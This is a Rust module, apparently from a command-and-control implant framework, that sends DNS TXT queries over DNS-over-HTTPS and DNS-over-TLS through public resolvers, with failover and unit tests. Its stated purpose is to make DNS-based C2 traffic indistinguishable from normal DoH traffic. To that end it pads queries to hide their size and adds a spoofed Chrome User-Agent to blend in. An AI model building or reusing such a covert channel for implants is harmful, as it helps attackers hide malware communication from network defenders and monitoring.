//! DNS-over-HTTPS (DoH) and DNS-over-TLS (DoT) transport.
//!
//! Routes DNS queries through encrypted HTTPS connections to public resolvers,
//! making DNS-based C2 traffic indistinguishable from normal DoH traffic.
//! Supports multiple DoH providers with automatic failover.

use super::TrafficError;
use serde::{Deserialize, Serialize};

/// Known public DoH resolver endpoints
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum DoHProvider {
    /// Google Public DNS (dns.google)
    Google,
    /// Cloudflare DNS (cloudflare-dns.com)
    Cloudflare,
    /// Quad9 (dns.quad9.net)
    Quad9,
    /// NextDNS (dns.nextdns.io)
    NextDns,
    /// Custom endpoint
    Custom,
}

impl DoHProvider {
    pub fn endpoint(&self) -> &str {
        match self {
            DoHProvider::Google => "https://dns.google/dns-query",
            DoHProvider::Cloudflare => "https://cloudflare-dns.com/dns-query",
            DoHProvider::Quad9 => "https://dns.quad9.net:5053/dns-query",
            DoHProvider::NextDns => "https://dns.nextdns.io/dns-query",
            DoHProvider::Custom => "", // must be provided separately
        }
    }

    /// JSON API endpoint (alternative to wire format)
    pub fn json_endpoint(&self) -> &str {
        match self {
            DoHProvider::Google => "https://dns.google/resolve",
            DoHProvider::Cloudflare => "https://cloudflare-dns.com/dns-query",
            DoHProvider::Quad9 => "https://dns.quad9.net:5053/dns-query",
            DoHProvider::NextDns => "https://dns.nextdns.io/dns-query",
            DoHProvider::Custom => "",
        }
    }
}

/// DoH query configuration
#[derive(Debug, Clone)]
pub struct DoHConfig {
    /// Primary DoH provider
    pub primary: DoHProvider,
    /// Fallback providers (tried in order)
    pub fallbacks: Vec<DoHProvider>,
    /// Custom endpoint URL (for DoHProvider::Custom)
    pub custom_endpoint: Option<String>,
    /// Use wire format (RFC 8484) vs JSON format
    pub wire_format: bool,
    /// Padding to obfuscate query size (RFC 7830)
    pub pad_queries: bool,
    /// Target padded size (bytes)
    pub pad_to: usize,
    /// HTTP method for DoH queries
    pub method: DoHMethod,
}

#[derive(Debug, Clone, Copy)]
pub enum DoHMethod {
    /// GET with dns= query parameter (more cacheable, but query visible in URL)
    Get,
    /// POST with binary body (preferred — query not in URL)
    Post,
}

impl Default for DoHConfig {
    fn default() -> Self {
        Self {
            primary: DoHProvider::Cloudflare,
            fallbacks: vec![DoHProvider::Google, DoHProvider::Quad9],
            custom_endpoint: None,
            wire_format: true,
            pad_queries: true,
            pad_to: 128,
            method: DoHMethod::Post,
        }
    }
}

/// Build a DNS wire-format query for a TXT record
pub fn build_dns_query(name: &str, pad_to: Option<usize>) -> Vec<u8> {
    let mut pkt = Vec::new();

    // Transaction ID (random)
    let txid: u16 = rand::random();
    pkt.extend_from_slice(&txid.to_be_bytes());

    // Flags: standard query, recursion desired
    pkt.extend_from_slice(&[0x01, 0x00]);

    // QDCOUNT=1, ANCOUNT=0, NSCOUNT=0, ARCOUNT=0 (or 1 if padding)
    let has_padding = pad_to.is_some();
    pkt.extend_from_slice(&[0x00, 0x01]); // QDCOUNT
    pkt.extend_from_slice(&[0x00, 0x00]); // ANCOUNT
    pkt.extend_from_slice(&[0x00, 0x00]); // NSCOUNT
    pkt.extend_from_slice(&if has_padding { [0x00, 0x01] } else { [0x00, 0x00] }); // ARCOUNT

    // Question: name + QTYPE(TXT=16) + QCLASS(IN=1)
    for label in name.split('.') {
        let len = label.len();
        if len > 63 {
            // Truncate oversized labels
            pkt.push(63);
            pkt.extend_from_slice(&label.as_bytes()[..63]);
        } else {
            pkt.push(len as u8);
            pkt.extend_from_slice(label.as_bytes());
        }
    }
    pkt.push(0); // root label
    pkt.extend_from_slice(&[0x00, 0x10]); // QTYPE = TXT
    pkt.extend_from_slice(&[0x00, 0x01]); // QCLASS = IN

    // EDNS0 OPT record with padding (RFC 7830)
    if let Some(target) = pad_to {
        // OPT RR: name=root, type=OPT(41), UDP size=4096, extended RCODE=0, version=0
        pkt.push(0); // root name
        pkt.extend_from_slice(&[0x00, 0x29]); // TYPE = OPT
        pkt.extend_from_slice(&[0x10, 0x00]); // UDP payload size = 4096
        pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // extended RCODE + flags

        // RDATA: EDNS padding option
        let current_len = pkt.len() + 2; // +2 for RDLENGTH field itself
        let pad_needed = target.saturating_sub(current_len + 4); // 4 = option code + length

        let rdlen = (4 + pad_needed) as u16;
        pkt.extend_from_slice(&rdlen.to_be_bytes()); // RDLENGTH

        // Padding option: code=12, length=pad_needed
        pkt.extend_from_slice(&[0x00, 0x0C]); // OPTION-CODE = Padding
        pkt.extend_from_slice(&(pad_needed as u16).to_be_bytes());
        pkt.extend_from_slice(&vec![0x00; pad_needed]);
    }

    pkt
}

/// Parse TXT records from a DNS wire-format response
pub fn parse_dns_response(data: &[u8]) -> Result<Vec<String>, TrafficError> {
    if data.len() < 12 {
        return Err(TrafficError::DnsResolution("response too short".into()));
    }

    let ancount = u16::from_be_bytes([data[6], data[7]]) as usize;
    if ancount == 0 {
        return Ok(Vec::new());
    }

    // Skip question section
    let mut pos = 12;
    while pos < data.len() && data[pos] != 0 {
        let label_len = data[pos] as usize;
        if label_len & 0xC0 == 0xC0 {
            pos += 2;
            break;
        }
        pos += label_len + 1;
    }
    if pos < data.len() && data[pos] == 0 {
        pos += 1;
    }
    pos += 4; // QTYPE + QCLASS

    let mut records = Vec::new();
    for _ in 0..ancount {
        if pos >= data.len() {
            break;
        }
        // Skip name (handle compression)
        if pos < data.len() && data[pos] & 0xC0 == 0xC0 {
            pos += 2;
        } else {
            while pos < data.len() && data[pos] != 0 {
                pos += data[pos] as usize + 1;
            }
            pos += 1;
        }

        if pos + 10 > data.len() {
            break;
        }
        let rtype = u16::from_be_bytes([data[pos], data[pos + 1]]);
        let rdlen = u16::from_be_bytes([data[pos + 8], data[pos + 9]]) as usize;
        pos += 10;

        if rtype == 16 {
            // TXT record: one or more <length><text> pairs
            let end = pos + rdlen;
            let mut txt = String::new();
            let mut tpos = pos;
            while tpos < end && tpos < data.len() {
                let tlen = data[tpos] as usize;
                tpos += 1;
                if tpos + tlen <= data.len() {
                    txt.push_str(&String::from_utf8_lossy(&data[tpos..tpos + tlen]));
                }
                tpos += tlen;
            }
            records.push(txt);
        }
        pos += rdlen;
    }

    Ok(records)
}

/// Build a DoH GET URL with the query encoded as base64url
pub fn build_doh_get_url(endpoint: &str, dns_query: &[u8]) -> String {
    let encoded = base64_url_encode(dns_query);
    format!("{endpoint}?dns={encoded}")
}

/// Base64url encoding (RFC 4648 §5) — no padding
fn base64_url_encode(data: &[u8]) -> String {
    use base64::Engine;
    base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(data)
}

/// Build HTTP headers for a DoH request
pub fn build_doh_headers(config: &DoHConfig) -> Vec<(String, String)> {
    let mut headers = vec![
        ("Accept".to_string(), "application/dns-message".to_string()),
    ];

    if matches!(config.method, DoHMethod::Post) {
        headers.push(("Content-Type".to_string(), "application/dns-message".to_string()));
    }

    // Add realistic browser headers to blend with normal HTTPS traffic
    headers.push(("User-Agent".to_string(),
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0".to_string()));

    headers
}

/// Resolve the DoH endpoint to use (with failover logic)
pub fn resolve_endpoint(config: &DoHConfig) -> Result<String, TrafficError> {
    if config.primary == DoHProvider::Custom {
        return config.custom_endpoint.clone()
            .ok_or_else(|| TrafficError::Config("custom DoH endpoint required".into()));
    }
    Ok(config.primary.endpoint().to_string())
}

/// DNS-over-TLS (DoT) configuration for port 853
#[derive(Debug, Clone)]
pub struct DoTConfig {
    /// DoT server address (default: Cloudflare 1.1.1.1:853)
    pub server: String,
    /// Server name for TLS verification
    pub tls_name: String,
    /// Connection timeout in seconds
    pub timeout_secs: u64,
}

impl Default for DoTConfig {
    fn default() -> Self {
        Self {
            server: "1.1.1.1:853".to_string(),
            tls_name: "cloudflare-dns.com".to_string(),
            timeout_secs: 10,
        }
    }
}

/// Build a DoT query frame (2-byte length prefix + DNS wire format)
pub fn build_dot_frame(dns_query: &[u8]) -> Vec<u8> {
    let len = dns_query.len() as u16;
    let mut frame = Vec::with_capacity(2 + dns_query.len());
    frame.extend_from_slice(&len.to_be_bytes());
    frame.extend_from_slice(dns_query);
    frame
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_build_dns_query() {
        let query = build_dns_query("test.example.com", None);
        // Should contain the domain name encoded as labels
        assert!(query.len() > 12);
        // Check QTYPE = TXT (0x0010) at the end of question
        let txt_marker = [0x00, 0x10, 0x00, 0x01];
        assert!(query.windows(4).any(|w| w == txt_marker));
    }

    #[test]
    fn test_build_dns_query_padded() {
        let query = build_dns_query("test.example.com", Some(256));
        // Padded query should be at least 256 bytes
        assert!(query.len() >= 200); // close to target after EDNS0 overhead
    }

    #[test]
    fn test_doh_get_url() {
        let query = build_dns_query("test.example.com", None);
        let url = build_doh_get_url("https://dns.google/dns-query", &query);
        assert!(url.starts_with("https://dns.google/dns-query?dns="));
        // Base64url encoded — the dns= parameter value should not have padding
        let dns_param = url.split("dns=").nth(1).unwrap();
        assert!(!dns_param.contains('='));
    }

    #[test]
    fn test_doh_headers() {
        let config = DoHConfig::default();
        let headers = build_doh_headers(&config);
        assert!(headers.iter().any(|(k, _)| k == "Accept"));
        assert!(headers.iter().any(|(k, v)| k == "Content-Type" && v == "application/dns-message"));
    }

    #[test]
    fn test_dot_frame() {
        let query = build_dns_query("test.example.com", None);
        let frame = build_dot_frame(&query);
        let len = u16::from_be_bytes([frame[0], frame[1]]) as usize;
        assert_eq!(len, query.len());
        assert_eq!(&frame[2..], &query[..]);
    }

    #[test]
    fn test_parse_empty_response() {
        // Minimal DNS response with 0 answers
        let resp = vec![
            0x13, 0x37, // txid
            0x81, 0x80, // flags
            0x00, 0x01, // QDCOUNT
            0x00, 0x00, // ANCOUNT = 0
            0x00, 0x00, // NSCOUNT
            0x00, 0x00, // ARCOUNT
            // Question section (minimal)
            0x04, b't', b'e', b's', b't', 0x00,
            0x00, 0x10, 0x00, 0x01,
        ];
        let records = parse_dns_response(&resp).unwrap();
        assert!(records.is_empty());
    }

    #[test]
    fn test_resolve_endpoint() {
        let config = DoHConfig::default();
        let endpoint = resolve_endpoint(&config).unwrap();
        assert_eq!(endpoint, "https://cloudflare-dns.com/dns-query");
    }

    #[test]
    fn test_custom_endpoint_required() {
        let config = DoHConfig {
            primary: DoHProvider::Custom,
            custom_endpoint: None,
            ..Default::default()
        };
        assert!(resolve_endpoint(&config).is_err());
    }
}
